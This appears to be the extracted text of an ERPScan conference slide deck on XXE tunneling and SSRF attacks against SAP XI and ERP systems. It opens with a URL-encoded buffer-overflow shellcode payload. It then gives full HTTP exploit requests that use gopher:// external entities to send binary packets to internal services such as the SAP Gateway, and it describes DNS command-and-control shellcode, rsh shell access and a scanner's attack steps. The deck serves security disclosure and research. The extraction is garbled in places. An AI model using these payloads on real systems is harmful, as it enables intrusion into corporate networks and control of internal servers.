%26%23%30%39%39%3b%26%23%31%33%39%3b%26%23%32%35%30%3b%26%23%31%37%35%3b%26%23%31%31%37%3b%26%23%32%33%34%3b%26%23%31%37%35%3b %26%23%31%31%37%3b%26%23%32%33%31%3b%26%23%32%35%35%3b%26%23%32%33%31%3b%26%23%31%34%34%3b%26%23%31%34%34%3b%26%23%31%34%34%3b %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41 %41%41%41%41%41%41%41%41%41%41%41%41%41%26%23%31%35%38%3b%26%23%31%34%3b%26%23%31%39%30%3b%26%23%31%37%31%3b%44%53%45%43%26%23%30%39%34%3b %26%23%30%32%33%3b%26%23%30%31%31%3b%26%23%30%30%31%3b%26%23%32%35%32%3b%26%23%30%34%39%3b%26%23%30%34%33%3b%2623%30%30%31%3b %26%23%32%31%32%3b%26%23%30%38%33%3b%26%23%32%34%32%3b%26%23%30%30%30%3b%26%23%30%31%38%3b%26%23%30%35%38%3b%26%23%30%37%31%3b %26%23%30%30%30%3b%26%23%32%35%30%3b%26%23%30%34%37%3b%26%23%30%35%37%3b%26%23%30%31%36%3b%26%23%30%37%36%3b%26%23%32%35%35%3b %26%23%30%38%34%3b%26%23%30%30%30%3b%26%23%30%30%31%3b%26%23%30%30%32%3b%26%23%30%30%30%3b%26%23%30%30%30%3b%26%23%32%32%36%3b %26%23%30%32%30%3b%26%23%30%39%35%3b%26%23%30%30%30%3b%26%23%30%36%34%3b%26%23%30%30%30%3b%26%23%30%30%30%3b%26%23%30%30%30%3b %26%23%30%39%37%3b%26%23%31%32%35%3b%26%23%30%38%38%3b%26%23%30%31%36%3b%26%23%31%31%35%3b%26%23%31%36%37%3b%26%23%31%31%33%3b %26%23%30%30%32%3b%26%23%31%31%37%3b%26%23%32%31%38%3b%26%23%31%35%37%3b%26%23%30%30%30%3b%26%23%30%30%34%3b%26%23%31%32%38%3b %26%23%30%36%39%3b%26%23%30%30%30%3b%26%23%30%38%32%3b%26%23%30%38%39%3b%26%23%30%31%32%3b%26%23%30%31%36%3b%26%23%32%33%35%3b %26%23%30%30%34%3b%26%23%32%33%35%3b%26%23%30%30%32%3b%26%23%31%33%34%3b%26%23%30%32%37%3b%26%23%31%39%38%3b%26%23%30%30%30%3b %26%23%32%35%35%3b%26%23%32%35%35%3b%26%23%32%33%33%3b%26%23%30%37%37%3b%26%23%32%35%35%3b%26%23%32%35%35%3b%26%23%32%5%35%3b %26%23%32%35%35%3b %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41 %41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%41%3c%2f%4e%41%4d%45%3e%3c%2f%6d%3a%52%53%50%4f%5f%52%5f %53%41%50%47%50%41%52%41%4d%3e%3c%2f%53%4f%41%50%2d%45%4e%56%3a%42%6f%64%79%3e%3c%2f%53%4f%41%50%2d%45%4e%56%3a%45%6e%76%65%6c%6f %70%65%3e">]><dmsg:generate  xmlns:dmsg='h5p://sap.com/fun/dilbert/msg'  2tle='&foo;'>1</dmsg:generate>     

XXE  Tunneling  to  Buffer  Overflow  

Server  A  on  the   Internet   (SAP  XI)    

POST  /XISOAPAdapter/servlet/
com.sap.aii.af.mp.soap.web.DilbertMSG? format=post  HTTP/1.1   Host:  sapserver.com:80      <?xml  version="1.0"  encoding="ISO--8859--1"?>     <!DOCTYPE  foo  [       <!ELEMENT  foo  ANY  >     <!ENTITY  date  SYSTEM  "gopher://[packetB]"   >]>     <foo>&date;</foo>  

h5p://company.com  

Packet  B    

Packet  C  ­  Command  and   Control  response  to  a[acker  by   DNS  protocol  which  is  allowed   for  outband  connec0ons  

Server  B  in  DMZ   (SAP  ERP)  
Port  8000   WebRFC   service  
Shellcode   service  with  
DNS   payload  
172.16.0.1  

Full  control  over  the  internal  system  through   the  Internet  

XXE  Tunneling  to  Rsh  
· Rlogin  is  an  old  service   · But  many  old  unix  systems  like  HP--UX,  AIX,  SunOS  
have  it  by  default   · Many  SAP  systems  based  on  listed  OS   · In  SAP  it  is  used  to  execute  trusted  commands       · Rlogin  allows  to  get  shell  access  remotely     · Poten2ally  exploitable  via  XXE    

SSRF  threats  
· Exploit  any  old  vulnerabili2es  in  OS  or  database  because   systems  secured  by  firewall  usually  lack  patches  
  
· Exploit  old  SAP  Applica2on  vulnerabili2es    
· Bypass  SAP  security  restric0ons  
· A  way  to  open  new  vulnerabili2es  

Bypass  SAP  security  restric0ons  
            It  is  possible  to  bypass  many  SAP  Security  restric5ons.   However,  it  is  not  so  easy  and  it  needs  addi5onal  research   for  every  service.  
  
· SAP  Gateway   · SAP  Message  Server   · Oracle  Remote  OS  Authen2ca2on   · Other  remote  services  

SAP  Gateway  server  security  bypass  
· SAP  Gateway  ­  remote  management  of  SAP   · Different  a5acks  are  possible  like  registering  fake  RFC  
service   · Now  secured  by  the  gw/monitor  op2on    
­ 0:  No  monitor  commands  are  accepted  
­ 1:  Only  monitor  commands  from  the  local  gateway  monitor   are  accepted  
­ 2:  Monitor  commands  from  local  and  remote  monitors  are   accepted.  
· With  XXE  Tunneling,  we  can  act  like  a  local  monitor   bypassing  restric2on  
· For  example  we  can  change  SAP  Gateway  parameters  
  

SAP  Gateway  server  security  bypass  
Hints  for  sending  binary  data  through  Gopher   1. You  need  to  encode  non--character  data  using  Urlencode   2. Gopher  is  changing  some  of  the  first  symbols  of  packet  to  
its  own.    
­ To  bypass  it,  you  need  to  enter  any  symbol  before  the  packet   ­ This  symbol  will  be  deleted  and  no  changes  will  occur  
3. Symbols  from  8A  to  99  are  not  allowed  so  if  they  exist  in   the  packet:  
­ You  can't  exploit  the  vulnerability   ­ You  should  replace  them  with  those  symbols    which  are  allowed  and  
hope  that  they  are  not  necessary    
It  was  found  that  in  Gateway  protocol  symbol      88  is  used  but  it  can  be  changed    

SAP  Gateway  server  security  bypass:  Exploit  
POST  /XISOAPAdapter/servlet/com.sap.aii.af.mp.soap.web.DilbertMSG?format=post   HTTP/1.1  
Host:  172.16.10.63:8001   Content--Length:  621  
    
<?xml  version="1.0"  encoding="UTF--8"?><!DOCTYPE  in  [<!ENTITY   l5  SYSTEM  "gopher://172.16.0.1:3301/a%00%00%00%7A %43%4F%4E%54%00%02%00%7A%67%77%2F%6D %61%78%5F%73%6C %65%65%70%00%00%00%00%79%02%00%00%00%00%00%0 0%28%DE%D9%00%79%5F%00%74%08%B5%38%7C %00%00%00%00%44%DE %D9%00%00%00%00%00%00%00%00%00%70%DE %D9%00%00%00%00%00%EA%1E %43%00%08%38%38%00%00%00%00%00%10%44%59%00%1 8%44%59%00%00%00%00%00%64%DE%D9%00%79%5F %00%74%08%B5%38%7C%00%00%00%00%79%DE %D9%00%00%00%00%7A%DE%D9%00%B3%56%35%7C %48%EF%38%7C%5F%57%35%7C%0A %00%00%00%B8%EE">]><dmsg:generate  xmlns:dmsg='h5p:// sap.com/fun/dilbert/msg'  2tle='&l5;'>1</dmsg:generate>  
  

SAP  Message  Server  security  bypass  
· Message  Server:  load  balancer   · If  not  configured  properly  can  be  vulnerable  to  different  
a5acks  like  configuring  fake  applica2on  server  or  changing   parameters   · However  by  default  it  is  secured  by  the  ms/monitor  op2on   now     ­ 0:  Only  applica0on  servers  are  allowed  to  change  the  
internal  memory  of  the  message  server  and  perform   monitoring  func2ons  (default).   ­ 1:  External  (monitoring  )  programs  are  also  allowed  to   do  this.      

SAP  Message  Server  security  bypass  
· Message  Server  using  a  session   · It   needs   to   send   mul2ple   packets   to   execute   an  
a5ack   · Seems  impossible  but   · More  2me  needed  for  inves2ga2on  

Oracle  DB  security  bypass  
· Oracle  DB:  backend  that  stores  all  data   · If  not  configured  properly  can  be  vulnerable  to  
unauthorized  access  using  the  <SID  >adm   username  only  without  password   · To  secure  Oracle  DB,  it  is  recommended  to:   ­ tcp.validnode_checking  =  yes   ­ tcp.invited_nodes  =  (hostname1,  hostname2)   ­ tcp.excluded_nodes  =  (other)   · The  same  problems  for  bypassing  as  in  Message   Server   · S2ll  inves2ga2ng  

Other  remote  services  
· Dozens  of  different  SAP  services  
­ More  than  10  in  ABAP   ­ More  than  20  in  J2EE   ­ More  that  20  others    
· All  of  them  are  enabled  by  default  and  can  have  some  issues   · Can  be  secured  by  firewalls  some2mes   · Can  be  secured  by  ACLs   · Some  vulnerabili0es  reported  by  us  s0ll  not  patched   · Any    single--packet  exploit  can  be  executed     

SSRF  threats  
· Exploit  any  old  vulnerabili2es  in  OS  or  database  because   systems  secured  by  firewall  usually  lack  patches  
  
· Exploit  old  SAP  Applica2on  vulnerabili2es    
· Bypass  SAP  security  restric2ons  
· A  way  to  open  new  vulnerabili0es  

A  way  to  open  new  vulnerabili0es  
· Before  XML  Tunneling,  vulnerabili2es  in  the  local   services  which  only  listen  127.0.0.1  were  not   interes2ng  
· Now  they  are  more  likely  to  be  exploited   · It  is  another  area  for  research  

Conclusion?  
"Let's  put  it  under  a  firewall"   is  not  a  solu2on  anymore  

XXE  Scanner  

Purpose  
   · Found  an  XML  Interface  and  want  to  try  if  it  is  
vulnerable  to  XXE?   Or   · Found  an  XXE  in  some  project  and  want  to  know  
which  a5acks  are  possible?   Or   · Found  an  XXE,  and  know  a  vulnerable  service  
inside  the  company,  and  want  to  exploit  it?  

How  is  it  working?  
· You  enter  a  vulnerable  URL   · You  point  XML  data   · You  create  parser  rules  

Few  steps  
· Test  
­ Test  if  XXE  is  working.  Configure  parser   rules  
· Scan  
­ Scan  for  available  informa2on  
· A5ack    
­ Exploit  SSRF  or  chained  a5ack  
  

Ac0on:  Test  
1. Create  rules  for  parser  
· t  --    2me   · c  --  content   · g  ­  grab  
c:Incrorrect    file  name:Excep5on  id;t:connec5on   problem:10;g:File  found:5tle=`%FILE%'>  
  
2. Test  for  local  file  read,    remote  share   read,  HTTP  scheme  support  ,  brute   for  different  schemes  support  

Ac0on:  Scan    
1. Bruteforce  and  download  files   2. Directory  lis2ng   3. Port  scan   4. SMB  shares  scan   5. HTTP  URL  scan  
     

Ac0on:  A[ack  
1. Send  a  custom  SSRF  HTTP  packet   2. Send  a  custom  TCP  packet  by  
gopher   3. Exploit  Windows  OS  +  DNS  
shellcode   4. Exploit  WAGO  PLC  
  
Soon,  others  may  appear.    

DEMO  

SOON  
1. Pre5y  GUI   2. Proxy  support   3. Documents  Type  Defini2ons  
(DTD)  generator   4. WSDL  transformer   5. Schema  detec2ons  
==Big  tnx  to  Alex  Turin==  

Conclusion  
· SSRF  a5acks  are  very  dangerous   · They  have  a  very  wide  range  s2ll  poorly  covered   · Gopher  example  is  not  the  only  one  I  suppose   · We  only  look  at  some  SAP  J2EE  engine  issues   · Just  with  a  brief  look  at  current  security  op2ons  they  
were  broken   · ERPScan  is  working  closely  with  SAP  to  fix  this  and  
other  architectural  problems  in  SAP  applica2ons  
  
· All  applica0on  servers  based  on  JRE  are  vulnerable!  

Web:                       www.erpscan.com   e--mail:        info@erpscan.com                                      Twi5er:    @erpscan                @sh2kerr     
     

